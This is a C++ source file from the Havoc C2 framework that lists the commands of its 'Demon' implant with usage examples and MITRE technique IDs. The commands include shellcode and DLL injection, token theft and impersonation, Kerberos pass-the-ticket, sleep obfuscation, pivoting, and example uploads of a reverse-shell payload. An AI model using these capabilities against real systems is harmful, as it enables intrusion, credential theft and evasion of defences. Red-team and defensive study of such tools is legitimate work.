#include <Havoc/DemonCmdDispatch.h>

#define BEHAVIOR_PROCESS_INJECTION  "Process Injection"
#define BEHAVIOR_PROCESS_CREATION   "Process Creation"
#define BEHAVIOR_FORK_AND_RUN       "Fork & Run"
#define BEHAVIOR_API_ONLY           "API Only"
#define BEHAVIOR_TEAMSERVER         "Teamserver side"

#define NO_SUBCOMMANDS  .Module = false,

using namespace HavocNamespace::HavocSpace;

std::vector<DemonCommands::Command_t> DemonCommands::DemonCommandList = {
        {
            .CommandString  = "help",
            .Description    = "Shows help message of specified command",
            .Usage          = "[command]",
            .Example        = "inline-execute",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "sleep",
            .Description    = "sets the delay to sleep",
            .MitreTechniques= { "T1029" ,"TA0005"},
            .Usage          = "[delay] (jitter)",
            .Example        = "10",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "checkin",
            .Description    = "request a checkin request",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "job",
            .Description    = "job manager",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "list",
                    .Description    = "list of jobs",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
                {
                    .CommandString  = "suspend",
                    .Description    = "suspend specified job id",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[id]",
                    .Example        = "1337",
                },
                {
                    .CommandString  = "resume",
                    .Description    = "resume specified job id",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[id]",
                    .Example        = "1337",
                },
                {
                    .CommandString  = "kill",
                    .Description    = "kill specified job id",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[id]",
                    .Example        = "1337",
                },
            }
        },
        {
            .CommandString  = "task",
            .Description    = "task manager",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "list",
                    .Description    = "list of commands in task queue",
                    .Behavior       = BEHAVIOR_TEAMSERVER,
                },
                {
                    .CommandString  = "clear",
                    .Description    = "clear all commands in task queue",
                    .Behavior       = BEHAVIOR_TEAMSERVER,
                },
            }
        },
        {
            .CommandString  = "proc",
            .Description    = "process enumeration and management",
            .Usage          = "[command]",
            .Example        = "list",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "list",
                    .Description    = "displays a list of running processes on the target",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques= { "TA0007", "T1057" },
                },
                {
                    .CommandString  = "kill",
                    .Description    = "kills the process from specified PID",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques= { "T1057", "TA0040" },
                    .Usage          = "[pid]",
                    .Example        = "1337",
                },
                {
                    .CommandString  = "create",
                    .Description    = "create a process",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = { "T1106", "T1055" },
                    .Usage          = "[normal/suspended] (--silent) (--no-pipe) process (args)",
                    .Example        = R"(suspended --no-pipe C:\Windows\System32\notepad.exe)",
                },
                {
                    .CommandString  = "modules",
                    .Description    = "lists loaded modules/dlls from a remote process",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = { "TA0007" },
                    .Usage          = "[pid]",
                    .Example        = "1337",
                },
                {
                    .CommandString  = "grep",
                    .Description    = "grep information from the specified remote process",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = { "T1020", "T1057" },
                    .Usage          = "[process]",
                    .Example        = "explorer.exe",
                },
                {
                    .CommandString  = "memory",
                    .Description    = "query for memory regions",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques= { "T1055"},
                    .Usage          = "[pid] [PAGE_READ | PAGE_READWRITE | PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE]",
                    .Example        = "1337 PAGE_EXECUTE_READWRITE",
                },
            },
        },
        {
            .CommandString  = "transfer",
            .Description    = "download transfer module",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "<subcommand>",
            .Example        = "list",
            .SubCommands    =
            {
                {
                    .CommandString  = "list",
                    .Description    = "list current downloads",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "",
                    .Example        = "",
                },
                {
                    .CommandString  = "stop",
                    .Description    = "stops a download",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "<FileID>",
                    .Example        = "ffff",
                },
                {
                    .CommandString  = "resume",
                    .Description    = "resumes a download",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "<FileID>",
                    .Example        = "ffff",
                },
                {
                    .CommandString  = "remove",
                    .Description    = "stops and removes a download",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "<FileID>",
                    .Example        = "ffff",
                },
            }
        },
        {
            .CommandString  = "dir",
            .Description    = "list specified directory",
            .Behavior       = BEHAVIOR_API_ONLY,
            .MitreTechniques = { "T1083", "T1083" },
            .Usage          = "[/path/to/dir]",
            .Example        = "c:\\windows\\system32",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "download",
            .Description    = "downloads a specified file",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/path/to/file.txt]",
            .Example        = "c:\\secrets.txt",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "upload",
            .Description    = "uploads a specified file",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/local/file/to/upload.exe] [/remote/path/to/upload.exe]",
            .Example        = "/tmp/reverse_shell.exe c:\\malware.exe",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "cd",
            .Description    = "change to specified directory",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/path/to/dir]",
            .Example        = "C:\\",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "cp",
            .Description    = "copy file from one location to another",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/path/from/file.txt] [path/to/file.txt]",
            .Example        = R"(C:\secrets.txt C:\Windows\Temp\secrets.txt)",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "remove",
            .Description    = "remove file or directory",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[path]",
            .Example        = "C:\\text.txt",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "mkdir",
            .Description    = "create new directory",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/path/to/dir]",
            .Example        = "C:\\NewDir",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "pwd",
            .Description    = "get current directory",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "",
            .Example        = "",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "cat",
            .Description    = "display content of the specified file",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/path/to/file.txt]",
            .Example        = "c:\\secrets.txt",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "screenshot",
            .Description    = "takes a screenshot",
            .Behavior       = BEHAVIOR_API_ONLY,
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "shell",
            .Description    = "executes cmd.exe commands and gets the output",
            .Behavior       = BEHAVIOR_PROCESS_CREATION,
            .Usage          = "[commands]",
            .Example        = R"(dir c:\windows\system32)",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "powershell",
            .Description    = "executes powershell.exe commands and gets the output",
            .Usage          = "[commands]",
            .Example        = R"(dir c:\windows\system32)",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "inline-execute",
            .Description    = "executes an object file",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[/path/to/objectfile.o] (arguments)",
            .Example        = R"(/tmp/objectfile.x64.o hello)",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "shellcode",
            .Description    = "shellcode injection techniques",
            .Usage          = "[subcommand]",
            .Example        = R"(inject-sys x64 1337 /tmp/rev_shell.x64.bin)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "inject",
                    .Description    = "inject shellcode into a remote process",
                    .Behavior       = BEHAVIOR_PROCESS_INJECTION,
                    .MitreTechniques= {"T1055"},
                    .Usage          = "[arch] [target pid] [/path/to/shellcode.x64.bin]",
                    .Example        = R"(x64 1337 /tmp/rev_shell.x64.bin)",
                },

                // Spawn & Inject Commands
                {
                    .CommandString  = "spawn",
                    .Description    = "spawns a temporary process and injects into it",
                    .Behavior       = BEHAVIOR_FORK_AND_RUN,
                    .MitreTechniques= {"T1055", "T1055.002"},
                    .Usage          = "[arch] [/path/to/shellcode.x64.bin]",
                    .Example        = R"(x64 /tmp/rev_shell.x64.bin)",
                },

                    // Spawn & Inject Commands
                {
                    .CommandString  = "execute",
                    .Description    = "executes shellcode in the current process (self inject)",
                    .Behavior       = BEHAVIOR_PROCESS_INJECTION,
                    .MitreTechniques= {"T1055", "T1055.002"},
                    .Usage          = "[arch] [/path/to/shellcode.x64.bin]",
                    .Example        = R"([arch] /tmp/rev_shell.x64.bin)",
                },
            },
        },
        {
            .CommandString  = "dll",
            .Description    = "dll spawn and injection modules",
            .Usage          = "[subcommand]",
            .Example        = R"(inject 1337 /tmp/module.dll argument)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "inject",
                    .Description    = "inject dll into a remote process",
                    .Behavior       = BEHAVIOR_PROCESS_INJECTION,
                    .MitreTechniques= {"T1055" ,"T1055.001"},
                    .Usage          = "[target pid] [/path/to/module.dll] (arguments)",
                    .Example        = R"(1337 /tmp/module.dll argument)",
                },
                {
                    .CommandString  = "spawn",
                    .Description    = "spawns a temporary process and injects a dll into it",
                    .Behavior       = BEHAVIOR_FORK_AND_RUN,
                    .MitreTechniques= {"T1055" ,"T1055.001"},
                    .Usage          = "[/path/to/reflective_dll.x64.dll] (arguments)",
                    .Example        = R"(/tmp/module.dll arguments)",
                },
            },
        },
        {
            .CommandString  = "exit",
            .Description    = "cleanup and exit",
            .Behavior       = BEHAVIOR_API_ONLY,
            .MitreTechniques= { },
            .Usage          = "[thread/process]",
            .Example        = R"(thread)",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "token",
            .Description    = "token manipulation and impersonation",
            .Usage          = "[subcommand]",
            .Example        = R"(steal 1337)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "getuid",
                    .Description    = "get current uid from token",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134"},
                },
                {
                    .CommandString  = "list",
                    .Description    = "list stolen tokens from token vault",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134"},
                },
                {
                    .CommandString  = "find",
                    .Description    = "find all tokens that can be stolen on the system",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134"},
                },
                {
                    .CommandString  = "steal",
                    .Description    = "steal token from specified process and save it to token vault",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134.001"},
                    .Usage          = "[process id] (handle)",
                    .Example        = "1337",
                },
                {
                    .CommandString  = "impersonate",
                    .Description    = "impersonate stolen token from specified vault id",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134", "T1134.001" ,"TA0004"},
                    .Usage          = "[vault id]",
                    .Example        = "0",
                },
                {
                    .CommandString  = "make",
                    .Description    = "make token from user credentials",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134", "T1134.003"},
                    .Usage          = "[Domain] [Username] [Password] ",
                    .Example        = "domain.local Administrator Passw0rd@1234",
                },
                {
                    .CommandString  = "privs-list",
                    .Description    = "list all privileges from current token",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = { "T1134" ,"TA0007"},
                },
                {
                    .CommandString  = "privs-get",
                    .Description    = "enable a privilege",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = { "T1134", "T1134", "TA0004" },
                },
                {
                    .CommandString  = "revert",
                    .Description    = "revert to default process token",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1134"},
                },
                {
                    .CommandString  = "remove",
                    .Description    = "remove specified stolen token from token vault",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[vault id]",
                    .Example        = "1",
                },
                {
                    .CommandString  = "clear",
                    .Description    = "removes every stolen token from the token vault",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
            },
        },
        {
            .CommandString  = "dotnet",
            .Description    = "execute and manage dotnet assemblies",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[sub command]",
            .Example        = R"(inline-execute /tmp/seatbelt.exe)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "list-versions",
                    .Description    = "lists installed/available dotnet versions",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
                {
                    .CommandString  = "inline-execute",
                    .Description    = "executes assembly in the current process and gets output",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .MitreTechniques = {"T1055", "T1620"},
                    .Usage          = "[/path/to/assembly.exe] (args)",
                    .Example        = "/tmp/Seatbelt.exe -group=all -full",
                },
            },
        },
        {
            .CommandString  = "net",
            .Description    = "network and host enumeration module",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[sub command] (args)",
            .Example        = R"(domain)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "domain",
                    .Description    = "display domain for the current host",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
                {
                    .CommandString  = "logons",
                    .Description    = "lists users logged onto a host",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
                {
                    .CommandString  = "sessions",
                    .Description    = "lists sessions on a host",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
                /*{
                    .CommandString  = "computers",
                    .Description    = "lists hosts in a domain (groups)",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
                {
                    .CommandString  = "dclist",
                    .Description    = "lists domain controllers",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },*/
                {
                    .CommandString  = "share",
                    .Description    = "lists shares on a host",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
                {
                    .CommandString  = "localgroup",
                    .Description    = "lists local groups and users in local groups",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
                {
                    .CommandString  = "group",
                    .Description    = "lists groups and users in groups",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
                {
                    .CommandString  = "users",
                    .Description    = "lists users and user information",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = R"([\\TARGET])",
                    .Example        = R"(\\localhost)",
                },
            },
        },
        {
            .CommandString  = "config",
            .Description    = "configure the behaviour of the demon session",
            .Usage          = "[config.flag]",
            .Example        = R"(inject.spawn64 C:\Windows\System32\rundll32.exe)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "implant.verbose",
                    .Description    = "enable/disable implant verbose logging (process creation, memory allocation, thread execution etc.)",
                    .Usage          = R"([true/false])",
                    .Example        = "true",
                },
                {
                    .CommandString  = "implant.sleep-obf.start-addr",
                    .Description    = "set custom thread start addr at sleep obfuscation",
                    .Usage          = R"([ lib!function+offset])",
                    .Example        = "ntdll!LdrLoadLibrary+0x46",
                },
                {
                    .CommandString  = "implant.sleep-obf.technique",
                    .Description    = "set custom thread start addr at sleep obfuscation",
                    .Usage          = R"([0/1/2])",
                    .Example        = "1",
                    .Options        = {
                        "0  => WaitForSingleObjectEx (No Obfuscation. simple sleep)",
                        "1  => Foliage (by @ilove2pwn_)",
                        "2  => Ekko (by @C5pider, @peterwintrsmith and @modexpblog)",
                    },
                },
                {
                    .CommandString  = "implant.coffee.veh",
                    .Description    = "enable/disable VEH for object file loading",
                    .Usage          = R"([true/false])",
                    .Example        = "true",
                },
                {
                    .CommandString  = "implant.coffee.threaded",
                    .Description    = "enable/disable threading while executing object files",
                    .Usage          = R"([true/false])",
                    .Example        = "true",
                },
                {
                    .CommandString  = "memory.alloc",
                    .Description    = "memory allocation behaviour",
                    .Usage          = R"([1/2/3])",
                    .Example        = "1",
                    .Options        = {
                        "1  => Win32 API (VirtualAllocEX)",
                        "2  => Native API (NtAllocateVirtualMemory)",
                    },
                },
                {
                    .CommandString  = "memory.execute",
                    .Description    = "memory executing behaviour (remote/local thread)",
                    .Usage          = R"([ 1 / 2 / 3 / 4 ])",
                    .Example        = "1",
                    .Options        = {
                        "1  => Win32 API (CreateRemoteThread)",
                        "2  => Native API (NtCreateThreadEx)",
                    },
                },
                {
                    .CommandString  = "inject.spoofaddr",
                    .Description    = "inject code with spoofed thread start addr",
                    .Usage          = R"([ lib!function+offset ])",
                    .Example        = "ntdll!LdrLoadLibrary+0x46",
                },
                {
                    .CommandString  = "inject.spawn64",
                    .Description    = "default x64 process to spawn for fork & run operations",
                    .Usage          = R"([C:\path\to\executable.exe])",
                    .Example        = R"(C:\Windows\System32\rundll32.exe)",
                },
                {
                    .CommandString  = "inject.spawn32",
                    .Description    = "default x86 process to spawn for fork & run operations",
                    .Usage          = R"([C:\path\to\executable.exe])",
                    .Example        = R"(C:\Windows\SysWow64\rundll32.exe)",
                },
                {
                    .CommandString  = "killdate",
                    .Description    = "change the default KillDate, set to 0 to disable. The time is interpreted in GMT 0",
                    .Usage          = R"([YEAR-MONTH-DAY HOUR-MINUTE-SECOND])",
                    .Example        = R"(2006-01-02 15:04:05)",
                },
                {
                    .CommandString  = "workinghours",
                    .Description    = "change the working hours, set to 0 to disable.",
                    .Usage          = R"([H:mm-H-mm])",
                    .Example        = R"(8:30-19:00)",
                },
            },
        },
        {
            .CommandString  = "pivot",
            .Description    = "pivoting module",
            .Behavior       = BEHAVIOR_API_ONLY,
            .Usage          = "[sub command]",
            .Example        = R"(connect SPIDERS-PC agent_6d6e)",
            .Module         = true,

            .SubCommands    =
            {
                {
                    .CommandString  = "list",
                    .Description    = "list connected agent pivots",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
                {
                    .CommandString  = "connect",
                    .Description    = "connect to a pivoting agent",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[Host] [Address]",
                    .Example        = R"(HOST-DC agent_6d6e)",
                },
                {
                    .CommandString  = "disconnect",
                    .Description    = "disconnect from a pivoting agent",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[Agent ID]",
                    .Example        = R"(64656d6e)",
                },
            },
        },
        {
            .CommandString  = "rportfwd",
            .Description    = "reverse port forwarding",
            .Usage          = "[sub command] (args)",
            .Example        = "add 0.0.0.0 8080 192.157.0.1 4444",
            .Module         = true,
            
            .SubCommands    =
            {
                {
                    .CommandString  = "add",
                    .Description    = "add an reverse port forward",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[bind host] [bind port] [forward host] [forward port]",
                    .Example        = "0.0.0.0 8080 192.157.0.1 4444",
                },
                {
                    .CommandString  = "list",
                    .Description    = "list all reverse port forwards",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
                {
                    .CommandString  = "remove",
                    .Description    = "close and remove a reverse port forward",
                    .Behavior       = BEHAVIOR_API_ONLY,
                    .Usage          = "[Socket ID]",
                    .Example        = R"(b4bbb42)",
                },
                {
                    .CommandString  = "clear",
                    .Description    = "close and clear all reverse port forwards",
                    .Behavior       = BEHAVIOR_API_ONLY,
                },
            },
        },
        {
            .CommandString  = "socks",
            .Description    = "socks5 proxy",
            .Usage          = "[sub command] (args)",
            .Example        = "add 4444",
            .Module         = true,

            .SubCommands    =
                {
                    {
                        .CommandString  = "add",
                        .Description    = "add a socks5 proxy",
                        .Behavior       = BEHAVIOR_API_ONLY,
                        .Usage          = "[bind port]",
                        .Example        = "4444",
                    },
                    {
                        .CommandString  = "list",
                        .Description    = "list all socks5 proxy servers",
                        .Behavior       = BEHAVIOR_API_ONLY,
                    },
                    {
                        .CommandString  = "kill",
                        .Description    = "kill and remove a socks5 proxy server",
                        .Behavior       = BEHAVIOR_API_ONLY,
                        .Usage          = "[bind port]",
                        .Example        = R"(4444)",
                    },
                    {
                        .CommandString  = "clear",
                        .Description    = "kill and clear all socks5 proxy servers",
                        .Behavior       = BEHAVIOR_API_ONLY,
                    },
                },
        },
        {
            .CommandString  = "luid",
            .Description    = "get current logon ID",
            .Usage          = "",
            .Example        = "",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "klist",
            .Description    = "list Kerberos tickets",
            .Usage          = "[/luid 0x123| /all]",
            .Example        = "/all",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "purge",
            .Description    = "purge a Kerberos ticket",
            .Usage          = "/luid <0x123>",
            .Example        = "/luid 0x123",
            NO_SUBCOMMANDS
        },
        {
            .CommandString  = "ptt",
            .Description    = "import Kerberos ticket into a logon session",
            .Usage          = "<base64> [/luid <0x0>]",
            .Example        = "doIFqjCCBaagAwIB...",
            NO_SUBCOMMANDS
        },
};
